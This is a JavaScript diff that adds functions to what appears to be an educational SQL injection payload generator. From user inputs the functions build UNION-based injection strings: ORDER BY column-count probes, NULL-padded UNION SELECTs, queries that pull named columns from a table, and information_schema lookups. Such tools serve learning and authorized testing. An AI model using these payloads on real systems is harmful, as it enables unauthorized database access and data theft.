@@ -61,6 +61,72 @@ function SwitchColorMode() {
     }
 }
 
+function generateUnionOrderBy() {
+    var orderByNumber = document.getElementById('OrderBy-Number').value.trim();
+    var commentOption = document.getElementById('comment-options-1').value;
+
+    if (orderByNumber === '') {
+        alert('Please enter the Order By number.');
+        return;
+    }
+
+    var unionQuery = "1' ORDER BY " + orderByNumber + commentOption;
+    document.getElementById('Union-Query-1').value = unionQuery;
+
+    // Show the explanation
+    document.querySelector('.explanation').style.display = 'block';
+}
+
+
+function generateUnionSelectNull() {
+    var numNulls = document.getElementById('Num-Nulls').value.trim();
+
+    if (numNulls === '') {
+        alert('Please enter the number of NULLs.');
+        return;
+    }
+
+    var unionQuery = "1' UNION SELECT " + "NULL, ".repeat(numNulls - 1) + "NULL--";
+    document.getElementById('Union-Query-2').value = unionQuery;
+
+    // Show the explanation
+    document.querySelector('.explanation').style.display = 'block';
+}
+
+
+function generateUnionExfiltrate1() {
+    var tableName = document.getElementById('UE1-Table').value.trim();
+    var column1 = document.getElementById('UE1-Column1').value.trim();
+    var column2 = document.getElementById('UE1-Column2').value.trim();
+    var commentOption = document.getElementById('comment-options-3').value;
+
+    if (tableName === '' || column1 === '' || column2 === '') {
+        alert('Please enter table name and both column names.');
+        return;
+    }
+
+    var unionQuery = "' UNION SELECT " + column1 + ", " + column2 + " FROM " + tableName + commentOption;
+    document.getElementById('Union-Query-3').value = unionQuery;
+
+    // Show the explanation
+    document.querySelector('.explanation').style.display = 'block';
+}
+
+function generateUnionInfoSchemaTable() {
+    var tableName = document.getElementById('TableName').value.trim();
+    var commentOption = document.getElementById('comment-options-5').value;
+
+    if (tableName === '') {
+      alert('Please enter the table name.');
+      return;
+    }
+
+    var unionQuery = "1' UNION SELECT * FROM information_schema.tables WHERE table_name = '" + tableName + "'" + commentOption;
+    document.getElementById('Union-Query-5').value = unionQuery;
+
+    // Show the explanation
+    document.querySelector('.explanation').style.display = 'block';
+  }
 
 
 document.addEventListener("DOMContentLoaded", function () {
